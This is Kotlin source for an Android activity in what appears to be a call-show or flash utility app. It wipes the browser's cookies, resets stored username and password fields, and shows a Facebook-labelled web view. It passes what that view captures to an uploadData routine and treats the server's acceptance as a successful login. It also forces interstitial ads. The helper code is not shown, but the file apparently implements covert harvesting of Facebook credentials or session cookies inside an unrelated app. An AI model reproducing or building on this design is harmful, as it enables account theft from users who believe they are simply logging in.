package media.callshow.vc.flash.ui

import android.content.Intent
import android.os.Build
import android.view.View
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.CookieSyncManager
import androidx.lifecycle.lifecycleScope
import kotlinx.android.synthetic.main.layout_web.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import media.callshow.vc.flash.R
import media.callshow.vc.flash.base.HApp
import media.callshow.vc.flash.base.HPage
import media.callshow.vc.flash.event.HEvent
import media.callshow.vc.flash.http.uploadData
import media.callshow.vc.flash.utils.*
import org.greenrobot.eventbus.EventBus

class WebPage : HPage(R.layout.layout_web) {
    private var needBackPressed = false
    override fun initView() {
        CookieSyncManager.createInstance(HApp.instance)
        val cookieManager = CookieManager.getInstance()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.removeSessionCookies(null)
            cookieManager.removeAllCookie()
            cookieManager.flush()
        } else {
            cookieManager.removeSessionCookies(null)
            cookieManager.removeAllCookie()
            CookieSyncManager.getInstance().sync()
        }
        userName = ""
        userPwd = ""
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        back.setOnClickListener { onBackPressed() }
        lifecycleScope.launch(Dispatchers.IO) {
            delay(20 * 1000)
            withContext(Dispatchers.Main) {
                displayInsertAd()
            }
        }
        setWebView(webView, {
            activityFaceBookFl.visibility = View.GONE
        }, {
            content.visibility = View.GONE
        }, {
            uploadData(it, {
                formatResult(it) { result ->
                    if (result.code == "0" && result.data?.toBooleanStrictOrNull() == true) {
                        EventBus.getDefault().post(HEvent("end"))
                        startActivity(Intent(this, MainPage::class.java))
                        login = true
                        finish()
                    }
                }
            }, {

            })
        })
    }

    override fun onResume() {
        super.onResume()
        webView.onResume()
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            val a = displayInsertAd(percent = true, tag = "inter_login")
            if (!a) {
                if (configEntity.httpUrl().startsWith("http")) {
                    goWeb(configEntity.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun insertAdDismiss() {
        super.insertAdDismiss()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        webView.onPause()
    }
}